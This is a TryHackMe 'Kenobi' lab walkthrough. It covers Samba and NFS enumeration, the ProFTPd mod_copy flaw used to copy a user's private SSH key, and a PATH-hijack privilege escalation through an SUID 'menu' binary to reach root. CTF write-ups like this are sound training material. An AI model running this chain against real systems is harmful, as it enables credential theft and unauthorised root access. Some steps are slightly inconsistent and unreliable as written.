# Tryhackme Kenobi Room Address

***https://tryhackme.com/room/kenobi***

Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation. 

----------------------------------------

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

##  [Task 1] Deploy the vulnerable machine 

### 1 : Make sure you're connected to our network and deploy the machine

### 2 : Scan the machine with nmap, how many ports are open?

**nmap -sC -sV <machine ip>**
ports : ***7***

-------------------------------------------

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often refereed to as a network file system.

## [Task 2] Enumerating Samba for shares 

### 1 : Using nmap we can enumerate a machine for SMB shares.

***nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>***

Using the nmap command above, how many shares have been found?

***3***

### 2 : On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.

***smbclient //<ip>/anonymous***

Once you're connected, list the files on the share. What is the file can you see?

***log.txt***

### 3 : You can recursively download the SMB share too. Submit the username and password as nothing.

***smbget -R smb://<ip>/anonymous***

now we have the log.txt

What port is FTP running on?

***21***

### 4 :  	

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

***nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>***

What mount can we see?

***var***

----------------------------------------------

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

##  [Task 3] Gain initial access with ProFtpd 

### 1 : Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

What is the version?

***1.3.5***

### 2 : We can use searchsploit to find exploits for a particular software version.

Searchsploit is basically just a command line search tool for exploit-db.com.

How many exploits are there for the ProFTPd running?

***3***

### 3 :  	You should have found an exploit from ProFtpd's mod_copy module. 

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

### 4 : We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

***ftp <ip>***

login with user as anonymous and password as anonymous

now

***site cpfr /home/kenobi/.ssh/id_rsa***

***site cpto /var/tmp/id_rsa***

### 5 : Lets mount the /var/tmp directory to our machine

```
mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

now copy the id_rsa to our directory

***umount mnt/kenobiNFS***

***chmod 600 id_rsa***

***ssh -i id_rsa kenobi@<ip>***

now we have the user flag

------------------------------------------

##  [Task 4] Privilege Escalation with Path Variable Manipulation 

### 1 : SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: find / -perm -u=s -type f 2>/dev/null

What file looks particularly out of the ordinary? 

***/usr/bin/menu***

### 2 : Run the binary, how many options appear?

***3***

### 3 : Strings is a command on Linux that looks for human readable strings on a binary.

***strings /usr/bin/menu***

```
curl -I localhost
uname -r
ifconfig
```

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

***echo /bin/bash > curl***

***chmod 777 curl***

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

***export PATH=/tmp:$PATH***

now run

***/usr/bin/menu***

enter a choice and now we are ***root***

***---------------------------------------------------***
